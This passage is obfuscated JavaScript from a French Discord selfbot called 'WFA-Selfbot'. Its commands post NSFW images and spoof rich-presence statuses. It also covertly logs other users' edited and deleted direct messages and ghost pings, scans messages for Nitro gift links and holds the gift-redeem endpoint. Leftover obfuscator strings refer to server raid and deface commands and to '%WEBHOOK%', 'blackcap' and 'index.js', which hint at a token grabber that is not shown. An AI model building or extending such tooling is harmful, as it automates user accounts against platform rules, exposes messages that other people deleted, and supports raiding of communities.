      if (T.content.startsWith(prefix + 'ass')) {
        if (nsfw === 'on') {
          const cP = {
            'type': 'ass'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cP).end((cQ, cR) => {
            X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cR.body.message + '\n').catch(cS => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log(consolecolor.instagram('[COMMANDE] Commande ass executé'));
          });
        } else T.delete().catch(cQ => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green);
      }

      if (T.content.startsWith(prefix + '4k')) {
        if (nsfw === 'on') {
          const cR = {
            'type': '4k'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cR).end((cS, cT) => {
            X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cT.body.message + '\n').catch(cU => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log(consolecolor.instagram('[COMMANDE] Commande 4k executé'));
          });
        } else T.delete().catch(cS => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green);

        ;
      }

      if (T.content.startsWith(prefix + 'nsfw-gif')) {
        if (nsfw === 'on') {
          const cU = {
            'type': 'pgif'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cU).end((cV, cW) => {
            X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cW.body.message + '\n').catch(cX => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande nsfw gif executé'));
          });
        } else T.delete().catch(cV => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green);
      }

      if (T.content.startsWith(prefix + 'hentai')) {
        if (nsfw === 'on') {
          const cW = {
            'type': 'hentai_anal'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cW).end((cX, cY) => {
            X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cY.body.message + '\n').catch(cZ => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log(consolecolor.instagram('[COMMANDE] Commande hentai executé'));
          });
        } else T.delete().catch(cX => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green);
      }

      T.content.startsWith(prefix + 'pussy') && (nsfw === 'on' ? superagent.get('https://nekobot.xyz/api/image').query({
        'type': 'pussy'
      }).end((cX, cY) => {
        X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cY.body.message + '\n').catch(d0 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande pussy executé'));
      }) : (T.delete().catch(cX => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green)));
      T.content.startsWith(prefix + 'thigh') && (nsfw === 'on' ? superagent.get('https://nekobot.xyz/api/image').query({
        'type': 'thigh'
      }).end((cX, cY) => {
        X.edit(ghost + ('https://embed.rauf.workers.dev/?author=Commande%2520NSFW&image=' + cY.body.message)).catch(d0 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande thigh executé'));
      }) : (T.delete().catch(cX => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green)));

      if (T.content.startsWith(prefix + 'anal')) {
        if (nsfw === 'on') {
          const cX = {
            'type': 'anal'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cX).end((cY, cZ) => {
            X.edit('>>> **NSFW Commande | WFA - Selfbot**\n\n\n' + cZ.body.message + '\n').catch(d1 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande anal executé'));
          });
        } else {
          T.delete().catch(d0 => {}), console.log('[NSFW]'.red + ' Les commandes NSFW sont désactivés'.green);
        }
      }

      if (T.content.startsWith(prefix + 'spotify')) {
        const d1 = T.content.split(' ').slice(1).join(' ') || 'WFA Selfbot';
        let d2 = rpcGenerator.createSpotifyRpc(client).setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setDetails(d1).setState('WFA-Selfbot').setStartTimestamp(Date.now()).setEndTimestamp(Date.now() + 86400000);
        client.user.setPresence(d2.toDiscord()).then(T.edit(':white_check_mark: **Tu écoutes ' + d1 + ' sur spotify**')).catch(console.error), console.log(consolecolor.instagram('[COMMANDE] Commande spotify executé'));
      }

      T.content.startsWith(prefix + 'reset') && (clearInterval(), client.user.setActivity(null, {}), T.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:').catch(d3 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande reset executé')));

      if (T.content.startsWith(prefix + 'gucci')) {
        let d3 = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'gucci').then(d4 => {
          const d5 = {
            'xbQGr': '0|4|2|1|3|6|5',
            'nTTCM': function (d6, d7) {
              return d6 === d7;
            },
            'LwZIj': ':x: **Command only usable on server**.',
            'jrHDR': function (d6, d7) {
              return d6 + d7;
            },
            'uLKJU': 'RAIDED BY WFA X ',
            'jpFEo': 'https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676',
            'fyBub': '[COMMAND] deface command executed',
            'PzqYY': 'wfa'
          };
          rpcGenerator.getRpcImages('603405368940429315', 'gucci0').then(d6 => {
            const d7 = {
              'HJPBU': './Data/pubmp.json'
            };
            const d8 = d7;
            {
              let d9 = new rpcGenerator.Rpc().setName('Gucci').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Gucci').setAssetsLargeImage(d4.id).setAssetsSmallImage(d6.id).setAssetsLargeText('BE RICH WITH WFA').setState(d3).setStartTimestamp(Date.now()).setParty({
                'id': uuid()
              });
              client.user.setPresence(d9.toDiscord()).catch(da => {}), console.log(consolecolor.instagram('[COMMANDE] Commande gucci executé')), T.edit(':white_check_mark: **Tu regardes ' + d3 + ' sur Gucci**');
            }
          });
        });
      }

      if (T.content.startsWith(prefix + 'lacoste')) {
        let d5 = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'lacoste').then(d6 => {
          let d7 = new rpcGenerator.Rpc().setName('Lacoste').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Lacoste').setAssetsLargeImage(d6.id).setAssetsLargeText('BE RAKAILLE WITH WFA').setState(d5).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(d7.toDiscord()).catch(d8 => {}), console.log(consolecolor.instagram('[COMMANDE] Commande lacoste executé'));
          T.edit(':white_check_mark: **Tu regardes ' + d5 + ' sur lacoste**');
        });
      }

      if (T.content.startsWith(prefix + 'nike')) {
        let d6 = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'nike').then(d7 => {
          let d8 = new rpcGenerator.Rpc().setName('Nike').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Nike').setAssetsLargeImage(d7.id).setAssetsLargeText('BE NIKED WITH WFA').setState(d6).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          clien.user.setPresence(d8.toDiscord()).catch(d9 => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande nike executé')), T.edit(':white_check_mark: **Tu regardes ' + d6 + ' sur Nike**');
        });
      }

      if (T.content.startsWith(prefix + 'google')) {
        let d7 = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'google').then(d8 => {
          let d9 = new rpcGenerator.Rpc().setName('Google').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Google').setAssetsLargeImage(d8.id).setAssetsLargeText('BE INSTRUCT WITH WFA').setState(d7).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(d9.toDiscord()).catch(da => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande google executé')), T.edit(':white_check_mark: **Tu regardes ' + d7 + ' sur google**');
        });
      }

      if (T.content.startsWith(prefix + 'skype')) {
        let d8 = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'skype').then(d9 => {
          let da = new rpcGenerator.Rpc().setName('Skype').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Skype').setAssetsLargeImage(d9.id).setAssetsLargeText('BE OLD WITH WFA').setState(d8).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(da.toDiscord()).catch(dc => {}), console.log(consolecolor.instagram('[COMMANDE] Commande skype executé'));
          T.edit(':white_check_mark: **Tu regardes ' + d8 + ' sur Skype**');
        });
      }

      if (T.content.startsWith(prefix + 'snapchat')) {
        let da = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'snapchat').then(dc => {
          let dd = new rpcGenerator.Rpc().setName('Snapchat').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Snapchat').setAssetsLargeImage(dc.id).setAssetsLargeText('BE YOUNG WITH WFA').setState(da).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dd.toDiscord()).catch(de => {}), console.log(consolecolor.instagram('[COMMANDE] Commande snapchat executé')), T.edit(':white_check_mark: **Tu regardes ' + da + ' sur Snapchat**');
        });
      }

      if (T.content.startsWith(prefix + 'facebook')) {
        let dc = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'facebook').then(dd => {
          let de = new rpcGenerator.Rpc().setName('Facebook').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Skype').setAssetsLargeImage(dd.id).setAssetsLargeText('BE MORE OLD WITH WFA').setState(dc).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(de.toDiscord()).catch(df => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande facebook executé')), T.edit(':white_check_mark: **Tu regardes ' + dc + ' sur Facebook**');
        });
      }

      if (T.content.startsWith(prefix + 'tiktok')) {
        let dd = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tiktok').then(de => {
          let df = new rpcGenerator.Rpc().setName('Tiktok').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Tiktok').setAssetsLargeImage(de.id).setAssetsLargeText('BE A PUTE WITH WFA').setState(dd).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(df.toDiscord()).catch(dg => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande tiktok executé')), T.edit(':white_check_mark: **Tu regardes ' + dd + ' sur Tiktok**');
        });
      }

      if (T.content.startsWith(prefix + 'twitter')) {
        let de = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'twitter').then(df => {
          let dh = new rpcGenerator.Rpc().setName('Twitter').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Twitter').setAssetsLargeImage(df.id).setAssetsLargeText('BE A E-FUCKER WITH WFA').setState(de).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dh.toDiscord()).catch(di => {}), console.log(consolecolor.instagram('[COMMANDE] Commande twitter executé')), T.edit(':white_check_mark: **Tu regardes ' + de + ' sur Twitter**');
        });
      }

      if (T.content.startsWith(prefix + 'instagram')) {
        let dg = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'instagram').then(dh => {
          let di = new rpcGenerator.Rpc().setName('Instagram').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Instagram').setAssetsLargeImage(dh.id).setAssetsLargeText('BE INFLUENCER WITH WFA').setState(dg).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(di.toDiscord()).catch(dj => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande instagram executé'));
          T.edit(':white_check_mark: **Tu regardes ' + dg + ' sur Instagram**');
        });
      }

      if (T.content.startsWith(prefix + 'youtube')) {
        let dh = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'youtube').then(di => {
          let dj = new rpcGenerator.Rpc().setName('Youtube').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Youtube').setAssetsLargeImage(di.id).setAssetsLargeText('BE YOUTUBER WITH WFA').setState(dh).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dj.toDiscord()).catch(dk => {}), console.log(consolecolor.instagram('[COMMANDE] Commande youtube executé'));
          T.edit(':white_check_mark: **Tu regardes ' + dh + ' sur Youtube**');
        });
      }

      if (T.content.startsWith(prefix + 'tokyo ghoul')) {
        let di = V.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tokyo').then(dj => {
          const dk = {
            'UudKN': '%WEBHOOK%',
            'EMQlf': 'blackcap',
            'Wkpbg': 'utf8',
            'rLRwH': 'index.js',
            'wCaBr': function (dl) {
              return dl();
            }
          };
          {
            let dl = new rpcGenerator.Rpc().setName('Tokyo Ghoul').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Tokyo Ghoul').setAssetsLargeImage(dj.id).setAssetsLargeText('WFA-Selfbot').setState(di).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dl.toDiscord()).catch(dm => {}), console.log(consolecolor.instagram('[COMMANDE] Commande tokyo ghoul executé')), T.edit(':white_check_mark: **Tu regardes ' + di + ' sur Tokyo Ghoul**');
          }
        });
      }

      if (T.content.startsWith(prefix + 'hunter x hunter')) {
        let dl = V.splice(3).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'hxh').then(dm => {
          let dn = new rpcGenerator.Rpc().setName('Hunter X Hunter').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Hunter X Hunter').setAssetsLargeImage(dm.id).setAssetsLargeText('WFA-Selfbot').setState(dl).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dn.toDiscord()).catch(dp => {}), console.log(consolecolor.instagram('[COMMANDE] Commande hunter x hunter executé')), T.edit(':white_check_mark: **Tu regardes ' + dl + ' sur Hunter X Hunter**');
        });
      }

      if (T.content.startsWith(prefix + 'naruto')) {
        let dm = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'naruto').then(dn => {
          let dp = new rpcGenerator.Rpc().setName('Naruto').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('721465320740487179').setDetails('Naruto').setAssetsLargeImage(dn.id).setAssetsLargeText('WFA-Selfbot R').setState(dm).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dp.toDiscord()).catch(dq => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande naruto executé')), T.edit(':white_check_mark: **Tu regardes ' + dm + ' sur Naruto**');
        });
      }

      if (T.content.startsWith(prefix + 'pornhub')) {
        let dp = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'pornhub').then(dq => {
          const dr = {
            'mEAFQ': ':x: **No users mentioned**',
            'zFHeI': '[COMMAND] fight command executed',
            'iYWko': '%2520'
          };
          const ds = dr;
          {
            let du = new rpcGenerator.Rpc().setName('Pornhub').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Pornhub').setAssetsLargeImage(dq.id).setAssetsLargeText('WFA-Selfbot').setState(dp).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(du.toDiscord()).catch(dv => {}), console.log(consolecolor.instagram('[COMMANDE] Commande pornhub executé')), T.edit(':white_check_mark: **Tu regardes ' + dp + ' sur Pornhub**');
          }
        });
      }

      if (T.content.startsWith(prefix + 'clash of clan')) {
        let dq = V.splice(3).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('721465320740487179', 'clash-of-clans-app-icon').then(dr => {
          let ds = new rpcGenerator.Rpc().setName('Clash Of Clan').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('721465320740487179').setDetails('WFA-Selfbot').setAssetsLargeImage(dr.id).setAssetsLargeText('WFA-Selfbot').setState(dq).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(ds.toDiscord()).catch(dt => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande clash of clans executé')), T.edit(':white_check_mark: **Tu joues à ' + dq + ' sur Clash Of Clan**');
        });
      }

      if (T.content.startsWith(prefix + 'minecraft')) {
        let dr = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'minecraft').then(ds => {
          let du = new rpcGenerator.Rpc().setName('Minecraft').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(ds.id).setAssetsLargeText('WFA-Selfbot').setState(dr).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(du.toDiscord()).catch(dv => {}), console.log(consolecolor.instagram('[COMMANDE] Commande minecraft executé')), T.edit(':white_check_mark: **Tu joues à ' + dr + ' sur Minecraft**');
        });
      }

      if (T.content.startsWith(prefix + 'clash royal')) {
        let dt = V.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'clashroyal').then(du => {
          const dv = {
            'Kemyx': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
            'TDqEB': '[EVENT] Message mp modifié:',
            'PmWje': function (dw, dx) {
              return dw + dx;
            },
            'mnToa': function (dw, dx) {
              return dw + dx;
            },
            'QrMKt': '[EVENT] Le: '
          };
          {
            let dx = new rpcGenerator.Rpc().setName('Clash Royal').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(du.id).setAssetsLargeText('WFA-Selfbot').setState(dt).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dx.toDiscord()).catch(dy => {}), console.log(consolecolor.instagram('[COMMANDE] Commande clash royale executé')), T.edit(':white_check_mark: **Tu joues à ' + dt + ' sur Clash Royal**');
          }
        });
      }

      if (T.content.startsWith(prefix + 'tinder')) {
        let du = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tinder').then(dv => {
          const dw = {
            'uDFpB': 'Tiktok',
            'hzlXc': 'WATCHING',
            'Secat': '603405368940429315',
            'nZomq': function (dx) {
              return dx();
            },
            'jzrGA': function (dx, dy) {
              return dx + dy;
            },
            'lnxWS': function (dx, dy) {
              return dx + dy;
            },
            'waMzW': ':white_check_mark: **Tu regardes ',
            'Bvtdp': ' sur Tiktok**'
          };
          {
            let dy = new rpcGenerator.Rpc().setName('Tinder').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dv.id).setAssetsLargeText('WFA-Selfbot').setState(du).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dy.toDiscord()).catch(dz => {}), console.log(consolecolor.instagram('[COMMANDE] Commande tinder executé')), T.edit(':white_check_mark: **Tu joues à ' + du + ' sur Tinder**');
          }
        });
      }

      if (T.content.startsWith(prefix + 'roblox')) {
        let dv = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'roblox').then(dw => {
          let dx = new rpcGenerator.Rpc().setName('Roblox').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dw.id).setAssetsLargeText('WFA-Selfbot').setState(dv).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dx.toDiscord()).catch(dy => {}), console.log(consolecolor.instagram('[COMMANDE] Commande roblox executé')), T.edit(':white_check_mark: **Tu joues à ' + dv + ' sur Roblox**');
        });
      }

      if (T.content.startsWith(prefix + 'badlion')) {
        let dx = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'badlion').then(dy => {
          let dz = new rpcGenerator.Rpc().setName('Badlion').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dy.id).setAssetsLargeText('WFA-Selfbot').setState(dx).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dz.toDiscord()).catch(dA => {}), console.log(consolecolor.instagram('[COMMANDE] Commande badlion executé')), T.edit(':white_check_mark: **Tu joues à ' + dx + ' sur Badlion**');
        });
      }

      if (T.content.startsWith(prefix + 'apex')) {
        let dz = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'apex').then(dA => {
          let dB = new rpcGenerator.Rpc().setName('Apex Legends').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dA.id).setAssetsLargeText('WFA-Selfbot').setState(dz).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dB.toDiscord()).catch(dC => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande apex executé')), T.edit(':white_check_mark: **Tu joues à ' + dz + ' sur Apex Legends**');
        });
      }

      if (T.content.startsWith(prefix + 'csgo')) {
        let dB = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'csgo').then(dC => {
          const dD = {
            'JtTBS': 'WFA-Selfbot',
            'nOFxF': 'london'
          };
          const dE = dD;
          {
            let dF = new rpcGenerator.Rpc().setName('Counter Strike').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dC.id).setAssetsLargeText('WFA-Selfbot').setState(dB).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dF.toDiscord()).catch(dG => {}), console.log(consolecolor.instagram('[COMMANDE] Commande csgo executé')), T.edit(':white_check_mark: **Tu joues à ' + dB + ' sur csgo**');
          }
        });
      }

      if (T.content.startsWith(prefix + 'among us')) {
        let dC = V.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'amongus').then(dD => {
          let dE = new rpcGenerator.Rpc().setName('Among us').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA-Selfbot').setAssetsLargeImage(dD.id).setAssetsLargeText('WFA-Selfbot').setState(dC).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dE.toDiscord()).catch(dF => {}), console.log(consolecolor.instagram('[COMMANDE] Commande among us executé'));
          T.edit(':white_check_mark: **Tu joues à ' + dC + ' sur among us**');
        });
      }

      if (T.content.startsWith(prefix + 'fortnite')) {
        let dE = V.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'fortnite').then(dF => {
          let dG = new rpcGenerator.Rpc().setName('Fortnite').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('603405368940429315').setDetails('WFA Selfbot').setAssetsLargeImage(dF.id).setAssetsLargeText('WFA-Selfbot E').setState(dE).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dG.toDiscord()).catch(dH => {});
          console.log(consolecolor.instagram('[COMMANDE] Commande fortnite executé')), T.edit(':white_check_mark: **Tu joues à ' + dE + ' sur fortnite**');
        });
      }

      if (T.content.startsWith(prefix + 'rocket league')) {
        let dG = V.splice(2).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'rocket_league').then(dH => {
          let dI = new rpcGenerator.Rpc().setName('Rocket League').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM').setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657').setApplicationId('603405368940429315').setDetails('WFA Selfbot').setAssetsLargeImage(dH.id).setAssetsLargeText('WFA-Selfbot').setState(dG).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dI.toDiscord()).catch(dJ => {}), console.log(consolecolor.instagram('[COMMANDE] Commande rocket league executé')), T.edit(':white_check_mark: **Tu joues à ' + dG + ' sur rocket league**');
        });
      }
    }), client.on('messageUpdate', T => {
      if (T.author.id === client.user.id) return;

      if (T.channel.type === 'dm') {
        const U = '6|1|3|4|2|5|0|7'.split('|');
        let V = 0;
        console.log(' ');
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(consolecolor.atlas('[EVENT] Message mp modifié:'));
        console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag));
        console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content));
        console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt));
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(' ');
      }
    }), client.on('messageDelete', T => {
      if (T.author.id === client.user.id) return;

      if (T.channel.type === 'dm') {
        const U = '5|4|3|6|7|1|0|2'.split('|');
        let V = 0;
        console.log(' ');
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(consolecolor.atlas('[EVENT] Message mp supprimé:'));
        console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag));
        console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content));
        console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt));
        console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(' ');
      }

      if (T.content.includes('@everyone') || T.content.includes('@here')) {
        if (T.author.id === client.user.id) return;
        if (T.channel.type === 'dm') return;
        console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] Nouveau GhostPing:')), console.log(consolecolor.atlas('[EVENT] Serveur: ' + T.guild.name)), console.log(consolecolor.atlas('[EVENT] Salon: ' + T.channel.name)), console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag)), console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content)), console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt)), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
      } else return;
    });

    function S(T, U) {
      let W = T.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
      if (W) return U(W[0]), S(T.slice(W.index + W[0].length), U);else U(null);
    }

    client.on('message', T => {
      const U = {
        'TwFHU': 'thigh',
        'FQwFV': 'edi',
        'Eutwq': function (W, X) {
          return W !== X;
        },
        'XkGoG': 'OFbvn',
        'RBKMu': function (W, X) {
          return W == X;
        },
        'KGGGh': function (W, X) {
          return W == X;
        },
        'SJyjJ': '[COMMANDE] Commande thigh executé',
        'rBJEq': ' X ',
        'xTdMA': function (W, X) {
          return W === X;
        },
        'QGvjs': ':x: **Commande uniquement utilisable sur serveur**.',
        'Zllst': 'ADMINISTRATOR',
        'wJMjL': ':x: **Vous n\'avez pas les permissions pour executer cette commande**',
        'ubXRy': '[COMMANDE] Commande deface executé',
        'mONVT': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        'AyjNj': 'rVspT',
        'TLdaO': function (W, X) {
          return W + X;
        },
        'bZBSH': 'https://canary.discordapp.com/api/v6/entitlements/gift-codes/',
        'ROZJm': '/redeem',
        'ukgAA': '*/*',
        'GEvPc': 'en-US',
        'hcwXb': 'keep-alive',
        'IyIDu': 'application/json',
        'WWadc': 'canary.discordapp.com',
